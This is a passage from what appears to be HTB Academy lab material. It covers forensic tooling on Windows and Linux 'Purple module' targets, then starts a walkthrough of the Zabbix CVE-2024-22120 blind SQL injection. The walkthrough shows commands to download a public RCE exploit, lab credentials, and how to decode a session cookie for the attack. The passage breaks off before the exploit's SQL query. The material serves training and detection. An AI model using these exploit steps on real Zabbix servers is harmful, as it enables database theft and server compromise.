![Process Hacker showing java.exe memory results with string search filter options and addresses.](https://academy.hackthebox.com/storage/modules/257/ph5.png)

![Process Hacker showing java.exe memory results with filter pattern input for searching strings.](https://academy.hackthebox.com/storage/modules/257/ph6.png)

1. After filtering with `Contains (case-insensitive)` and entering `cmd.exe&params=`, the string was found within the memory space of the `java.exe` process. This could suggest the presence of commands or scripts being executed from within the `java.exe` process, potentially indicating malicious activity.

![Process Hacker showing java.exe memory results with addresses and string search results.](https://academy.hackthebox.com/storage/modules/257/ph7.png)

#### Traffic Analysis

To analyze network traffic related to the attack, you can leverage the automatic traffic capturing that is configured to occur on all Windows Purple module targets at boot. The traffic capture files can be accessed as follows:

1. Once the attack part is complete, connect to the Windows Purple module target (TeamCity host) via RDP.
2. Execute the `Stop-Traffic-Capture.bat` script located on the `desktop` to terminate traffic capture and access the saved files.
3. Navigate to the directory:
`C:\Tools\PCAP-Captures\Archives`, where the captured `.pcap` files are stored.
4. Unzip the archive and open the .pcap file(s) in Wireshark.

##### Inspecting HTTP Traffic in Wireshark

In Wireshark, we can quickly review the capture summary of HTTP requests for any suspicious activity by navigating to " `Statistics`" \> " `HTTP`" \> " `Requests`".

![Wireshark requests capture summary showing file paths and command parameters.](https://academy.hackthebox.com/storage/modules/257/teamcity-4.png)

HTTP `POST` requests can be shown using the `http.request.method` filter as follows:

```wireshark
http.request.method==POST

```

![Wireshark capture showing HTTP POST requests with details on source, destination, and command parameters.](https://academy.hackthebox.com/storage/modules/257/teamcity-6.png)

For deeper analysis:

- Right-click on a suspicious-looking packet.
- Select `Follow Stream` \> `HTTP Stream` to view detailed request and response data.

Example of HTTP request and response details:

![Wireshark HTTP stream showing a POST request with command parameters and server response details.](https://academy.hackthebox.com/storage/modules/257/teamcity-5.png)

The screenshot above highlights a segment of the attack where commands are executed via the `/app/rest/debug/processes` endpoint, demonstrating unauthorized use of the debug API to achieve remote code execution.

* * *

This is just the tip of the iceberg in terms of the possible detection avenues one can pursue by leveraging the built-in logging capabilities and the DFIR toolset of Windows Purple Module targets. Feel free to experiment and identify your own investigation avenues.


# Connecting to Linux Purple Module Targets

In this section, we will demonstrate how Secure Shell (SSH) can be used for connecting to Linux Purple module targets `after` the attack part of each section has concluded.

SSH (Secure Shell) enables secure network communication and is widely used for managing Linux systems.

## **Steps to Connect via SSH from Windows, macOS, and Linux (including Pwnbox):**

- If you are not using Pwnbox, download the `VPN connection file` by following the appropriate guide: use [this article](https://help.hackthebox.com/en/articles/9297532-connecting-to-academy-vpn) if logged into HTB Academy, or [this article](https://help.hackthebox.com/en/articles/5599332-enterprise-lab-access) if logged into HTB Enterprise. Then, use software such as [OpenVPN](https://openvpn.net/) to [connect to the VPN](https://help.hackthebox.com/en/articles/9297532-connecting-to-academy-vpn). If you are using Pwnbox, you are already connected to the VPN.
- After obtaining the IP address of the Linux Purple module target, displayed at the bottom of the respective section once the target has been spawned, use the command below to connect via SSH, specifying the following credentials:
  - Username: `root`
  - Password: `P3n#31337@LOG`

```shell
ssh username@<Target_IP> -v

The authenticity of host '<Target_IP>' can't be established.
Key fingerprint is SHA256:TgNhCKF6jXXXXXXXXX/MUj/+u0EBasUVXXXXXX.
This key is not known by any other names.

Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '<Target_IP>' to the list of known hosts.

username@<Target_IP>'s password:

Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-71-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

username@ubuntu:~#

```

**Notes**:

- This method provides command-line access only to the Linux Purple module target.
- You can also use tools such as `MobaXterm` or `Termius` to manage SSH connections. For Windows users, `PuTTY` is another excellent option.


# Available Linux DFIR Toolset

This section provides an overview of the installed DFIR toolset within the Linux Purple module targets, detailing the available tools/solutions and their respective locations.

## Installed Tools and Locations

Below is a list of the DFIR toolset installed on the Linux Purple module targets for `post-exploitation` forensic analysis purposes, along with their respective installation paths.

### System Monitoring & Auditing (Event Logging)

| **Tool** | **Path** | **Description** |
| --- | --- | --- |
| **Sysmon (Linux)** | `/usr/bin/sysmon` | Provides detailed event logging and detection. |
| **Auditd** | `/usr/sbin/auditd` | Auditing tool to track system-level events. |

### Threat Detection & Monitoring

| **Tool** | **Path** | **Description** |
| --- | --- | --- |
| **YARA** | `/usr/local/bin/yara` | Signature-based file scanning tool. |
| **Sigma** | `/usr/local/bin/sigma` | Generic signature format for SIEM rule creation. |
| **Suricata** | ` /usr/bin/suricata` | Open-source IDS/IPS with network monitoring capabilities. |
| **osquery** | `/usr/bin/osqueryi` | Endpoint monitoring using SQL-like queries. |
| **Zircolite** | `/root/zircolite/zircolite.py` | Sigma-based EVTX log analysis. |
| **Velociraptor** | `/usr/local/bin/velociraptor` ( `https://<Target_IP>:8889`) | Endpoint monitoring, collection, and response. |
| **bpftrace** (Added after this module's release; not available in its targets) | `/usr/bin/bpftrace` | High-level tracing language for Linux |

**Notes**:

- Specify the following credentials to log into `Velociraptor`:

  - Username: `admin`
  - Password: `P3n#31337@LOG`
- `Allow Linux Purple module targets to run for around 3-5 minutes after spawning` to ensure that all services have fully initialized (including Velociraptor).

### Traffic Capturing

| **Tool** | **Path** | **Description** |
| --- | --- | --- |
| **tcpdump** | `/usr/bin/tcpdump` | Packet capture tool for network traffic analysis. |

### Memory Dumping

| **Name** | **Path** | **Description** |
| --- | --- | --- |
| **LiME** | `/root/LiME/src/lime-5.15.0-71-generic.ko` | Linux Memory Extractor for memory forensics. |

### Memory Forensics

| **Name** | **Path** | **Description** |
| --- | --- | --- |
| **Volatility v2** | `/root/volatility-master/vol.py` | Memory forensics tool for analyzing memory dumps. |

### Miscellaneous

| **Name** | **Path** | **Description** |
| --- | --- | --- |
| **Python2.7** | `/usr/bin/python2.7` | Python2.7 is used for running python2 based tools i.e. vol.py |
| **Python3** | `/usr/bin/python3` | Python3 is used for running python3 based tools i.e. Zircolite |


# Linux Logs & Traffic Captured

In this section, we will explore the logs and traffic captures available on Linux Purple module targets, as well as how to access and manage them. Logging and traffic monitoring are essential for identifying suspicious activity. The logging and forensic mechanisms configured on Linux Purple module targets are designed to generate detailed, highly verbose logs, supporting both real-time monitoring and historical analysis.

## Event Logging

Linux Purple module targets are equipped with verbose logging mechanisms to ensure comprehensive tracking and monitoring of system activities, including command execution, network connections, and security events. In this section, we will explore the various locations where these logs can be reviewed and accessed.

#### Sysmon For Linux

[Sysmon for Linux](https://github.com/microsoft/SysmonForLinux) is a tool that monitors and logs system activity, including process lifetimes, network connections, file system writes, and more. Sysmon works across reboots and uses advanced filtering to help identify malicious activity, as well as how intruders and malware operate on a network. Sysmon for Linux is part of [Sysinternals](https://learn.microsoft.com/en-us/sysinternals/). It is installed and configured on all Linux Purple module targets.

Sysmon logs are stored in the `syslog` directory ( `/var/log/syslog`).

```shell
cat /var/log/syslog | /opt/sysmon/sysmonLogView
<SNIP>
Event SYSMONEVENT_SERVICE_CONFIGURATION_CHANGE
	UtcTime: 2024-11-21 06:53:43.427
	Configuration: collect-all.xml
	ConfigurationFileHash: -
Event SYSMONEVENT_SERVICE_STATE_CHANGE
	UtcTime: 2024-11-21 06:53:43.432
	State: Started
	Version: 1.3.3
	SchemaVersion: 4.81
Event SYSMONEVENT_FILE_DELETE
	RuleName: -
	UtcTime: 2024-11-21 06:53:43.415
	ProcessGuid: {00000000-0000-0000-0000-000000000000}
	ProcessId: 768
	User: -
	Image: /usr/usr/sbin/logrotate
	TargetFilename: /var/log/ubuntu-advantage.log.1
	Hashes: -
	IsExecutable: -
	Archived: -
Event SYSMONEVENT_FILE_CREATE
	RuleName: -
	UtcTime: 2024-11-21 06:53:43.415
	ProcessGuid: {00000000-0000-0000-0000-000000000000}
	ProcessId: 768
	Image: /usr/usr/sbin/logrotate
	TargetFilename: /var/log/ubuntu-advantage.log
	CreationUtcTime: 2024-11-21 06:53:43.415
	User: -
Event SYSMONEVENT_FILE_CREATE
	RuleName: -
	UtcTime: 2024-11-21 06:53:43.415
	ProcessGuid: {00000000-0000-0000-0000-000000000000}
	ProcessId: 768
	Image: /usr/usr/sbin/logrotate
	TargetFilename: /var/log/ubuntu-advantage-timer.log.1.gz
	CreationUtcTime: 2024-11-21 06:53:43.415
	User: -
Event SYSMONEVENT_CREATE_PROCESS
	RuleName: -
	UtcTime: 2024-11-21 06:53:43.415
	ProcessGuid: {97985f39-d8f7-673e-19d3-6a139b550000}
	ProcessId: 1387
	Image: /usr/usr/bin/gzip
	FileVersion: -
	Description: -
	Product: -
	Company: -
	OriginalFileName: -
	CommandLine: /bin/gzip
	CurrentDirectory: /
	User: root
	LogonGuid: {97985f39-0000-0000-0000-000000000000}
	LogonId: 0
	TerminalSessionId: 4294967295
	IntegrityLevel: no level
	Hashes: -
	ParentProcessGuid: {00000000-0000-0000-0000-000000000000}
	ParentProcessId: 768
	ParentImage: -
	ParentCommandLine: -
	ParentUser: -
Event SYSMONEVENT_PROCESS_TERMINATE
	RuleName: -
	UtcTime: 2024-11-21 06:53:43.424
	ProcessGuid: {97985f39-d8f7-673e-19d3-6a139b550000}
	ProcessId: 1387
	Image: /usr/usr/bin/gzip
	User: root
Event SYSMONEVENT_FILE_DELETE
	RuleName: -
	UtcTime: 2024-11-21 06:53:43.431
	ProcessGuid: {00000000-0000-0000-0000-000000000000}
	ProcessId: 768
	User: -
	Image: /usr/usr/sbin/logrotate
	TargetFilename: /var/log/ubuntu-advantage-timer.log.1
	Hashes: -
	IsExecutable: -
	Archived: -
Event SYSMONEVENT_PROCESS_TERMINATE
	RuleName: -
	UtcTime: 2024-11-21 06:53:43.439
	ProcessGuid: {97985f39-d8e6-673e-8d05-4d4f4e560000}
	ProcessId: 1
	Image: /usr/lib/systemd/systemd
<SNIP>

```

**Note**: The Sysmon configuration file in use is located at `/opt/sysmon/config.xml` (as referenced [here](https://github.com/microsoft/MSTIC-Sysmon/blob/main/linux/configs/collect-all.xml)). We can specify and apply our own Sysmon configuration before initiating the attack part of each section by modifying the `config.xml` file and running the following command to (re)start Sysmon with the specified configuration.

```shell
sysmon -accepteula -c /opt/sysmon/config.xml

```

#### Auditd

The Linux Audit Daemon ( `auditd`) is the user-space component of the Linux Auditing System, designed to collect, process, and record audit log events to disk. It plays a critical role in security monitoring and compliance by maintaining a detailed log of system activities, including file access, user actions, and system calls. These logs are invaluable for identifying potential security breaches, investigating incidents, and ensuring compliance with regulatory requirements.

`auditd` is installed and configured on all Linux Purple module targets.

The logs generated by `auditd` are saved by default at:

`/var/log/audit/audit.log`

**Notes**:

- The `auditd.conf` configuration file in use is located at `/etc/audit/auditd.conf`
- Auditd rules `audit.rules` are located at `/etc/audit/audit.rules` (taken from [here](https://github.com/Neo23x0/auditd/blob/master/audit.rules))

`auditd` logs are often reviewed using tools like `ausearch` or `aureport` for efficient analysis and reporting.

The command below shows an example.

```shell
ausearch -k rootcmd -i
----
type=PROCTITLE msg=audit(10/04/2024 16:31:50.464:387) : proctitle=/sbin/auditctl -R /etc/audit/audit.rules
type=SOCKADDR msg=audit(10/04/2024 16:31:50.464:387) : saddr={ saddr_fam=netlink nlnk-fam=16 nlnk-pid=0 }
type=SYSCALL msg=audit(10/04/2024 16:31:50.464:387) : arch=x86_64 syscall=sendto success=yes exit=1064 a0=0x3 a1=0x7ffd18a02030 a2=0x428 a3=0x0 items=0 ppid=731 pid=744 auid=unset uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=(none) ses=unset comm=auditctl exe=/usr/sbin/auditctl subj=unconfined key=(null)
type=CONFIG_CHANGE msg=audit(10/04/2024 16:31:50.464:387) : auid=unset ses=unset subj=unconfined op=add_rule key=rootcmd list=exit res=yes

```

* * *

## Traffic Capturing

The `tcpdump` tool is used to capture and analyze network traffic on all Linux Purple module targets. It is configured as a systemd service, and all captured traffic is saved in the `/tmp` directory. These files can be analyzed using tools like `Wireshark` or `tcpdump` itself.

```shell
systemctl list-units --type=service | grep tcpdump

tcpdump.service                    loaded active running "Systemd script for tcpdump"

```

```shell
ls /tmp/*pcap
/tmp/tcp_dump_2024-10-04-16:31:52.pcap

```

To manage these `.pcap` files efficiently, the service must first be stopped. The capture files can then be retrieved, and the service restarted to resume the traffic capturing process.

1. To stop the `tcpdump` service and access the `.pcap` files safely, the following command should be run.

```shell
sudo systemctl stop tcpdump.service

```

1. Once the service is stopped, the `.pcap` files located in the `/tmp` directory can be accessed. These files are named according to the timestamp corresponding to when the capture began.

```shell
ls /tmp/*.pcap -lah

-rw-r--r-- 1 tcpdump tcpdump 9.4M Oct  7 08:41 /tmp/tcp_dump_2023-10-07-07:57:24.pcap

```

`*.pcap` or `*.pcap.gz` files will exist in the `/tmp` directory.

1. After retrieving the .pcap files, the `tcpdump` service can be restarted to resume capturing traffic as follows.

```shell
sudo systemctl start tcpdump.service

```

To verify that the service is running properly after restarting, use the following command.

```shell
sudo systemctl status tcpdump.service
 tcpdump.service - "Systemd script for tcpdump"
     Loaded: loaded (/etc/systemd/system/tcpdump.service; enabled; vendor prese>
     Active: active (running) since Thu 2024-11-21 06:53:35 UTC; 3h 35min ago
   Main PID: 916 (tcpdump)
      Tasks: 1 (limit: 4570)
     Memory: 31.4M
        CPU: 1.169s
     CGroup: /system.slice/tcpdump.service
             └─916 /usr/bin/tcpdump -i ens160 -C 100 -G 86400 -w /tmp/tcp_dump_>

Nov 21 06:53:35 ubuntu systemd[1]: Started "Systemd script for tcpdump".
Nov 21 06:53:36 ubuntu bash[916]: tcpdump: listening on ens160, link-type EN10M>
lines 1-12/12 (END)

```

1. Once we have captured traffic in a `.pcap` file, we can use `tcpdump` to analyze it directly on the same system without the need for additional tools. `Tcpdump` is a powerful command-line utility that allows us to inspect network traffic in various ways.

For example, to focus specifically on DNS queries and responses, we can filter DNS traffic using `tcpdump` with the following command:

```shell
tcpdump -nn -r tcp_dump_2023-10-07-10\:37\:17.pcap port 53

reading from file tcp_dump_2023-10-07-10:37:17.pcap, link-type EN10MB (Ethernet), snapshot length 262144
10:37:37.737331 IP 10.129.XXX.XX.52092 > 1.1.1.1.53: 44868+ [1au] A? api.snapcraft.io. (45)
10:37:37.737832 IP 10.129.XXX.XX.44939 > 1.1.1.1.53: 42940+ [1au] AAAA? api.snapcraft.io. (45)
...SNIP...

```


# Dumping & Analyzing Linux Memory

In this section, we'll explore the memory dumping and analysis tools available on Linux Purple module targets. These tools are essential for capturing and analyzing system memory to investigate security incidents and uncover potential threats.

## Dumping Memory

In all Linux Purple module targets, the [LiME](https://github.com/504ensicsLabs/LiME) (Linux Memory Extractor) memory dumping tool is located at the following path:

`/root/LiME/src/lime-5.15.0-71-generic.ko`

`LiME` is a powerful kernel module used for capturing volatile memory from Linux systems for forensic analysis. Capturing memory with `LiME` can be performed as follows.

```shell
cd /root/LiME/src/
sudo insmod lime-5.15.0-71-generic.ko "path=/tmp/dump.mem format=lime"

```

The memory dump will be saved in the following location:
`/tmp/<specified filename>`

## Analyzing Memory

All Linux Purple module targets come pre-installed with `Volatility v2`. After capturing a memory dump from a Linux Purple module target, memory forensics could be performed using `Volatility v2` as follows (in this case, we are using Volatility's `linux_pslist` plugin to gather active tasks within the memory dump).

Please ensure that you specify the `LinuxUbuntu_5_15_0-71-generic_profilex64` profile when performing memory analysis with Volatility.

```shell
cd /root/volatility-master
python2.7 vol.py -f /tmp/dump.mem --profile=LinuxUbuntu_5_15_0-71-generic_profilex64 linux_pslist
Volatility Foundation Volatility Framework 2.6.1
WARNING : volatility.debug    : Overlay structure cpuinfo_x86 not present in vtypes
WARNING : volatility.debug    : Overlay structure cpuinfo_x86 not present in vtypes
Offset             Name                 Pid             PPid            Uid             Gid    DTB                Start Time
------------------ -------------------- --------------- --------------- --------------- ------ ------------------ ----------
0xffff96e540210000 systemd              1               0               0               0      0x00000001024c2000 2024-11-21 12:53:33 UTC+0000
0xffff96e540213280 kthreadd             2               0               0               0      ------------------ 2024-11-21 12:53:33 UTC+0000
0xffff96e540214bc0 rcu_gp               3               2               0               0      ------------------ 2024-11-21 12:53:33 UTC+0000
0xffff96e540216500 rcu_par_gp           4               2               0               0      ------------------ 2024-11-21 12:53:33 UTC+0000
0xffff96e540211940 slub_flushwq         5               2               0               0      ------------------ 2024-11-21 12:53:33 UTC+0000
0xffff96e5402ecbc0 netns                6               2               0               0      ------------------ 2024-11-21 12:53:33 UTC+0000
0xffff96e5402e9940 kworker/0:0H         8               2               0               0      ------------------ 2024-11-21 12:53:33 UTC+0000
0xffff96e5402eb280 mm_percpu_wq         10              2               0               0      ------------------ 2024-11-21 12:53:33 UTC+0000
0xffff96e540206500 rcu_tasks_rude_      11              2               0               0      ------------------ 2024-11-21 12:53:33 UTC+0000
0xffff96e540201940 rcu_tasks_trace      12              2               0               0      ------------------ 2024-11-21 12:53:33 UTC+0000
0xffff96e540200000 ksoftirqd/0          13              2               0               0      ------------------ 2024-11-21 12:53:33 UTC+0000
0xffff96e540203280 rcu_sched            14              2               0               0      ------------------ 2024-11-21 12:53:33 UTC+0000
0xffff96e540204bc0 migration/0          15              2               0               0      ------------------ 2024-11-21 12:53:33 UTC+0000
0xffff96e54020e500 idle_inject/0        16              2               0               0      ------------------ 2024-11-21 12:53:33 UTC+0000
0xffff96e54020b280 cpuhp/0              18              2               0               0      ------------------ 2024-11-21 12:53:33 UTC+0000
0xffff96e54020cbc0 cpuhp/1              19              2               0               0      ------------------ 2024-11-21 12:53:33 UTC+0000
0xffff96e5402a9940 idle_inject/1        20              2               0               0      ------------------ 2024-11-21 12:53:33 UTC+0000
0xffff96e5402a8000 migration/1          21              2               0               0      ------------------ 2024-11-21 12:53:33 UTC+0000
0xffff96e5402ab280 ksoftirqd/1          22              2               0               0      ------------------ 2024-11-21 12:53:33 UTC+0000
0xffff96e5402ae500 kworker/1:0H         24              2               0               0      ------------------ 2024-11-21 12:53:33 UTC+0000
0xffff96e5403b6500 kdevtmpfs            25              2               0               0      ------------------ 2024-11-21 12:53:33 UTC+0000
0xffff96e5403b1940 inet_frag_wq         26              2               0               0      ------------------ 2024-11-21 12:53:33 UTC+0000
0xffff96e5403b0000 kauditd              27              2               0               0      ------------------ 2024-11-21 12:53:33 UTC+0000
0xffff96e5403b3280 khungtaskd           28              2               0               0      ------------------ 2024-11-21 12:53:33 UTC+0000
0xffff96e5403b4bc0 oom_reaper           29              2               0               0      ------------------ 2024-11-21 12:53:33 UTC+0000
0xffff96e5403d0000 writeback            30              2               0               0      ------------------ 2024-11-21 12:53:33 UTC+0000
0xffff96e5403d3280 kcompactd0           31              2               0               0      ------------------ 2024-11-21 12:53:33 UTC+0000
0xffff96e5403d4bc0 ksmd                 32              2               0               0      ------------------ 2024-11-21 12:53:33 UTC+0000
0xffff96e5403d6500 khugepaged           33              2               0               0      ------------------ 2024-11-21 12:53:33 UTC+0000
0xffff96e540a66500 kintegrityd          80              2               0               0      ------------------ 2024-11-21 12:53:33 UTC+0000
0xffff96e540a61940 kblockd              81              2               0               0      ------------------ 2024-11-21 12:53:33 UTC+0000
0xffff96e540a60000 blkcg_punt_bio       82              2               0               0      ------------------ 2024-11-21 12:53:33 UTC+0000
0xffff96e540a5e500 tpm_dev_wq           83              2               0               0      ------------------ 2024-11-21 12:53:33 UTC+0000
0xffff96e540a63280 ata_sff              84              2               0               0      ------------------ 2024-11-21 12:53:33 UTC+0000
0xffff96e540a5cbc0 md                   85              2               0               0      ------------------ 2024-11-21 12:53:33 UTC+0000
0xffff96e540a64bc0 edac-poller          86              2               0               0      ------------------ 2024-11-21 12:53:33 UTC+0000
0xffff96e540a5b280 devfreq_wq           87              2               0               0      ------------------ 2024-11-21 12:53:33 UTC+0000
0xffff96e5409a6500 watchdogd            88              2               0               0      ------------------ 2024-11-21 12:53:33 UTC+0000
0xffff96e5409a4bc0 kworker/1:1H         90              2               0               0      ------------------ 2024-11-21 12:53:33 UTC+0000
0xffff96e5403e1940 kswapd0              92              2               0               0      ------------------ 2024-11-21 12:53:33 UTC+0000
0xffff96e5403e4bc0 ecryptfs-kthrea      93              2               0               0      ------------------ 2024-11-21 12:53:33 UTC+0000
0xffff96e5403e0000 kthrotld             95              2               0               0      ------------------ 2024-11-21 12:53:33 UTC+0000
0xffff96e5403d1940 irq/24-pciehp        96              2               0               0      ------------------ 2024-11-21 12:53:33 UTC+0000
0xffff96e5409b9940 irq/25-pciehp        97              2               0               0      ------------------ 2024-11-21 12:53:33 UTC+0000
0xffff96e5409be500 irq/26-pciehp        98              2               0               0      ------------------ 2024-11-21 12:53:33 UTC+0000
0xffff96e5409bcbc0 irq/27-pciehp        99              2               0               0      ------------------ 2024-11-21 12:53:33 UTC+0000
0xffff96e5409bb280 irq/28-pciehp        100             2               0               0      ------------------ 2024-11-21 12:53:33 UTC+0000
0xffff96e5409b8000 irq/29-pciehp        101             2               0               0      ------------------ 2024-11-21 12:53:33 UTC+0000
0xffff96e540a59940 irq/30-pciehp        102             2               0               0      ------------------ 2024-11-21 12:53:33 UTC+0000
0xffff96e5409b1940 irq/31-pciehp        103             2               0               0      ------------------ 2024-11-21 12:53:33 UTC+0000
0xffff96e5409b6500 irq/32-pciehp        104             2               0               0      ------------------ 2024-11-21 12:53:33 UTC+0000
0xffff96e5409b4bc0 irq/33-pciehp        105             2               0               0      ------------------ 2024-11-21 12:53:33 UTC+0000
0xffff96e5409b3280 irq/34-pciehp        106             2               0               0      ------------------ 2024-11-21 12:53:33 UTC+0000
0xffff96e5409b0000 irq/35-pciehp        107             2               0               0      ------------------ 2024-11-21 12:53:33 UTC+0000
0xffff96e5409ab280 irq/36-pciehp        108             2               0               0      ------------------ 2024-11-21 12:53:33 UTC+0000
0xffff96e5409a8000 irq/37-pciehp        109             2               0               0      ------------------ 2024-11-21 12:53:33 UTC+0000
0xffff96e5409a9940 irq/38-pciehp        110             2               0               0      ------------------ 2024-11-21 12:53:33 UTC+0000
0xffff96e5409ae500 irq/39-pciehp        111             2               0               0      ------------------ 2024-11-21 12:53:33 UTC+0000
0xffff96e5409acbc0 irq/40-pciehp        112             2               0               0      ------------------ 2024-11-21 12:53:33 UTC+0000
0xffff96e542060000 irq/41-pciehp        113             2               0

```


# Usage Example: Zabbix CVE-2024-22120

## Introduction

In today's rapidly evolving technological landscape, businesses increasingly rely on a growing number of systems to support their operations. As companies expand, their IT infrastructure becomes more complex, often spanning multiple platforms and environments. This exponential increase in systems makes it increasingly difficult to monitor effectively, leading to potential blind spots and inefficiencies. To address this, businesses strive to adopt automated and integrated IT monitoring systems like Zabbix, OpManager, Paessler PRTG, SolarWinds Server & Application Monitor, and others that provide real-time visibility and insights, ensuring optimal performance, security, and scalability as they grow.

[Zabbix](https://www.zabbix.com/) is open-source software for system monitoring. It tracks the performance and availability of various IT components, from servers to applications and cloud services. Zabbix provides visualizations, real-time monitoring, and alerts, assisting administrators in ensuring system availability and reliability using agents.

The architecture of Zabbix consists of the following key components:

- `Server`: The heart of the system monitoring and managing the communication from the agents.
- `Database storage`: Stores information gathered by agents and the configuration.
- `Web Interface`: A web-based graphical user interface for management, alerting, etc.
- `Proxy`: Can obtain data on behalf of a Zabbix server, acting as a load balancer.
- `Agent`: Software deployed on systems to actively monitor resources, applications, and execution of commands, sending data back to the Server.
- `Dashboards`: Personalized views of important data, including hosts, execution of predefined scripts, etc.

As a leading player in the infrastructure monitoring sector, Zabbix represents a prime target for exploitation due to its extensive access to systems, often referred to as holding the "keys to the kingdom." Zabbix offers various authentication methods, including HTTP, LDAP, SAML, and MFA. By default, Zabbix installs with a preset password ( `zabbix`) for the Administrator role and has `guest` account access disabled, although this can be activated under certain conditions.

This section provides an analysis of `CVE-2024-22120`, a critical vulnerability in Zabbix, examining its underpinnings, exploitation methods, and mitigation strategies.

This section is divided into two parts:

- `CVE-2024-22120 Analysis and Exploitation`: This part focuses on the technical details of the vulnerability, how it can be exploited, and strategies to both mitigate and detect it.

- `Post-Exploitation Forensic Analysis`: This part examines the forensic capabilities of Linux Purple Module targets by analyzing the system post-exploitation. It demonstrates how artifacts left by the attack can be identified and analyzed within a Linux Purple Module target to better understand the exploit’s impact and enhance our understanding of the attack from a defensive security perspective.


## CVE-2024-22120 Analysis and Exploitation

At the beginning of 2024, the security researcher Maxim Tyukov ( `mf0cuz`) identified and reported a [time-based blind SQL injection in Zabbix Server Audit Log](https://support.zabbix.com/browse/ZBX-24505) ( `CVE-2024-22120`). The vulnerability allows a low-level user to dump the database via SQL injection, potentially leading to full control over the Zabbix server. The exploitation relies on the `Audit log` feature, which records user activities and changes within the system. When the server executes commands for configured scripts, the corresponding action(s) is logged in the audit log. Find out more about SQL injections in the following modules: [SQL Injection Fundamentals](https://academy.hackthebox.com/course/preview/sql-injection-fundamentals), [SQLMap Essentials](https://academy.hackthebox.com/course/preview/sqlmap-essentials), and [Advanced SQL Injections](https://academy.hackthebox.com/course/preview/advanced-sql-injections).

#### Understanding the Vulnerability

The code of the [audit.c](https://git.zabbix.com/projects/ZBX/repos/zabbix/browse/src/libs/zbxaudit/audit.c?until=9dcd92d79c4b57ad6ffe87ad296700447b02cc3a&untilPath=src%2Flibs%2Fzbxaudit%2Faudit.c) file ( `src/libs/zbxaudit/audit.c`) contained improper sanitization of the `clientip` field within the `zbx_auditlog_global_script` function. The `clientip` field can be manipulated in the request sent, enabling attackers to inject SQL queries and exploit time-based blind SQL injection.

The vulnerable portion of the code we can see below:

```c
<SNIP>
	if (ZBX_DB_OK > zbx_db_execute("insert into auditlog (auditid,userid,username,clock,action,ip,resourceid,"
			"resourcename,resourcetype,recordsetid,details) values ('%s'," ZBX_FS_UI64 ",'%s',%d,'%d','%s',"
			ZBX_FS_UI64 ",'%s',%d,'%s','%s')", auditid_cuid, userid, username, (int)time(NULL),
			ZBX_AUDIT_ACTION_EXECUTE, clientip, hostid, hostname, AUDIT_RESOURCE_SCRIPT, auditid_cuid,
			details_esc))
	{
		ret = FAIL;
	}
<SNIP>

```

The above code snippet shows that the `clientip` is being passed to the IP variable in the SQL statement.

Falling into the critical severity category with a CVSS base score of [9.1](https://nvd.nist.gov/vuln/detail/CVE-2024-22120), the following versions of Zabbix are susceptible to this exploit:

- `6.0.0` \- `6.0.27`
- `6.4.0` \- `6.4.12`
- `7.0.0alpha1` \- `7.0.0beta1`

* * *

##### Exploitation Process

Let's navigate to the bottom of this section and click on ' `Click here to spawn the target system!`'. Then, let's SSH into the target IP using the provided credentials. The vast majority of the actions/commands covered from this point up to the end of this section can be replicated inside the target, offering a more comprehensive grasp of the topics presented.

Before exploiting the vulnerability, let's take a moment to identify the [exploit](https://github.com/W01fh4cker/CVE-2024-22120-RCE/blob/main/CVE-2024-22120-RCE.py)'s requirements by leveraging the `-h` flag. Additionally, the `pwn` Python module should also be installed to ensure proper functionality of the exploit.

```shell
wget https://raw.githubusercontent.com/W01fh4cker/CVE-2024-22120-RCE/refs/heads/main/CVE-2024-22120-RCE.py
pip3 install pwn
python3 CVE-2024-22120-RCE.py -h
usage: CVE-2024-22120-RCE.py [-h] [--false_time FALSE_TIME]
                             [--true_time TRUE_TIME] [--ip IP] [--port PORT]
                             [--sid SID] [--hostid HOSTID] [--prefix PREFIX]

CVE-2024-22120-RCE

options:
  -h, --help            show this help message and exit
  --false_time FALSE_TIME
                        Time to sleep in case of wrong guess(make it smaller
                        than true time, default=1)
  --true_time TRUE_TIME
                        Time to sleep in case of right guess(make it bigger
                        than false time, default=10)
  --ip IP               Zabbix server IP
  --port PORT           Zabbix server port(default=10051)
  --sid SID             Session ID of low privileged user
  --hostid HOSTID       hostid of any host accessible to user with defined sid
  --prefix PREFIX       Prefix for zabbix site. eg:
                        https://ip/PREFIX/index.php

```

The exploit requires a couple of key elements for its execution as prerequisites for the `time-based SQL blind injection` vulnerability in the `auditd` log:

- The session ID ( `sid`) of a low-privileged user with sufficient privileges to execute scripts on the Zabbix server.
- The `hostid`.

#### Obtaining a Low-privileged User's Session ID

The credentials below belong to a low-privileged user with sufficient privileges to execute scripts on the Zabbix server.

- URL: `http://<Target_IP>`
- Username: `htb-student`
- Password: `mysecurepassword`

![Zabbix dashboard showing host management with filters for name, host groups, IP, DNS, port, and severity. A dropdown menu under 'Zabbix server' offers options like Dashboards, Problems, and Scripts including Ping and Traceroute.](https://academy.hackthebox.com/storage/modules/257/image2.png)

The `sessionid` is stored in the `zbx_session` cookie, which is encoded in Base64 format.

![Browser storage panel showing cookies for http://10.129.231.23 with a session cookie named 'zbx_session' and its value.](https://academy.hackthebox.com/storage/modules/257/image3.png)

The cookie can be decoded using the following method:

```shell
echo "eyJzZXNzaW9uaWQiOiIzNWFjYTZiOWVlMzk5NjRjYWE5NDNhMDhlYzdmZjkyOSIsInNlcnZlckNoZWNrUmVzdWx0Ijp0cnVlLCJzZXJ2ZXJDaGVja1RpbWUiOjE3MTczOTgwOTcsInNpZ24iOiI1YWZiMWMzYTUzNDZiYjY5ODIyMWEwMDg2MTY3ZmM2MGI1NTNmNzgyOTIyMDU0NGM2MWFmODA5NTdkZjZjZWUxIn0" | base64 -d

{"sessionid":"35aca6b9ee39964caa943a08ec7ff929","serverCheckResult":true,"serverCheckTime":1717398097,"sign":"5afb1c3a5346bb698221a0086167fc60b553f7829220544c61af80957df6cee1"}

```

##### Obtaining HostID

The `hostid` can be retrieved by launching `Web Developer Tools` (Ctrl + Shift + I) in Firefox/Pwnbox and then searching for `hostids` in the page source as follows:

![Zabbix dashboard displaying CPU utilization, system information, host availability, problems by severity, and a geomap. Inspector tool shows HTML code highlighting 'hostids'.](https://academy.hackthebox.com/storage/modules/257/hostids.png)

#### Understanding the Exploit Code

Let's now take a moment to thoroughly analyze the exploit code.

The script automates the extraction of the admin `sessionid` from the database, retrieving it one character at a time using the following SQL query:

```sql
